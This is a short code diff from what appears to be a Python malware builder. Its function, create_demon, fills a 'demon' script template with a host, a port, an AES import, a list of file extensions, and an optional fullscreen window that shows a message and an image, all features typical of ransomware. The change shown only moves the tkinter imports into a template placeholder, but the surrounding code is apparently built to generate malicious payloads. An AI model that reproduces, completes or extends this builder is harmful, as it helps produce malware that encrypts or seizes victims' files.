@@ -5,9 +5,7 @@ def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debu
 import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
 from pathlib import Path
-from tkinter import *
-from tkinter.ttk import *
-from io import BytesIO
+<ttk>
 
 <import_random>
 <import_aes>
@@ -159,6 +157,11 @@ class mainwindow(Tk):
     start_gui = """main = mainwindow()
         main.mainloop()"""
 
+    ttk = '''from tkinter import *
+from tkinter.ttk import *
+from io import BytesIO
+'''
+
     ext_list = ''
     for line in ext.split('\n'):
         if not line == '':
@@ -178,10 +181,12 @@ class mainwindow(Tk):
 
 
     if mode == 1:
+        demon = demon.replace('<ttk>', ttk)
         demon = demon.replace('<gui>', gui)
         demon = demon.replace('<start_gui>', start_gui)
     elif mode == 2:
         demon = demon.replace('<import_pil>', '')
+        demon = demon.replace('<ttk>', '')
         demon = demon.replace('<gui>', '')
         demon = demon.replace('<start_gui>', '')
 
